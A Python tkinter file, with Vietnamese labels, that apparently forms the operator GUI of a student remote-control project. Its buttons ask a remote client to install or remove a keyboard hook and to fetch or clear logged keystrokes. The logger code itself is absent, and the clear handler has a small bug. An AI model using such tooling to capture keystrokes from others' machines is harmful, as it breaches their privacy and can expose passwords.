import tkinter
from tkinter.messagebox import showinfo
from client import ClientState
from Request_gui import Request

class Keystroke(Request):
    def __init__(self, client):
        super().__init__(client, "KEYLOG")

    def ShowWindow(self):
        self.MainWindow = tkinter.Tk()
        self.MainWindow.title("Keystroke")

        self.MainWindow.geometry("470x400")
        
        self.keystroke_listbox = tkinter.Listbox(self.MainWindow)
        self.keystroke_listbox.place(x = 30 , y = 80, height = 300, width = 420)

        HookButton = tkinter.Button(self.MainWindow, text = 'Hook', command = self.OnHookButton)
        HookButton.place(x = 30, y = 10, height = 60, width = 100)

        UnHookButton = tkinter.Button(self.MainWindow, text = 'Unhook', command = self.OnUnhookButton)
        UnHookButton.place(x = 140, y = 10, height = 60, width = 90)

        PrintButton = tkinter.Button(self.MainWindow, text = 'In phím', command = self.OnPrintButton)
        PrintButton.place(x = 240, y = 10, height = 60, width = 100)

        ClaerButton = tkinter.Button(self.MainWindow, text = 'Xóa', command = self.OnClearButton)
        ClaerButton.place(x = 350, y = 10, height = 60, width = 100)

        self.MainWindow.protocol('WM_DELETE_WINDOW', self.OnExitGUI)

        self.MainWindow.mainloop()

    def OnHookButton(self):
        state, _ = self.client.MakeRequest("HOOK")
        if state == ClientState.SUCCEEDED:
            self.keystroke_listbox.insert(tkinter.END, 'Hook đã được cài\n')
            # showinfo(title = '', message = 'Hook đã được cài')
            # In "Hook đã được cài" ra cái ô to to
            pass
        else:
            self.keystroke_listbox.insert(tkinter.END, 'Lỗi\n')
            # In "Lỗi"
            pass
        
        return None

    def OnUnhookButton(self):
        state, _ = self.client.MakeRequest("UNHOOK")
        if state == ClientState.SUCCEEDED:
            self.keystroke_listbox.insert(tkinter.END, 'Hook đã được gỡ\n')
            # showinfo(title = '', message = 'Hook đã được gỡ')
            # In "Hook đã được gỡ"
            pass
        else:
            self.keystroke_listbox.insert(tkinter.END, 'Lỗi\n')
            # In "Lỗi"
            pass
        return None

    def OnPrintButton(self):
        state, data = self.client.MakeRequest("FETCH")
        try:
            assert state == ClientState.SUCCEEDED, "KEYLOG FETCH request failed"
            assert data, "No data retrieved"
            data = data.decode("utf-8")         
            
            #In data
            self.keystroke_listbox.insert(tkinter.END, data)
            
        except Exception as e:
            #In lỗi
            self.keystroke_listbox.insert(tkinter.END, e)
            pass

    def OnClearButton(self):
        state, _ = self.client.MakeRequest("CLEAR")
        # Xóa chữ
        if state == ClientState.SUCCEEDED:
            key_size = len(self.keystroke_listbox.get())
            for item in range (key_size):
                self.keystroke_listbox.delete(0)


if __name__ == "__main__":
    a = Keystroke(None)
    a.ShowWindow()
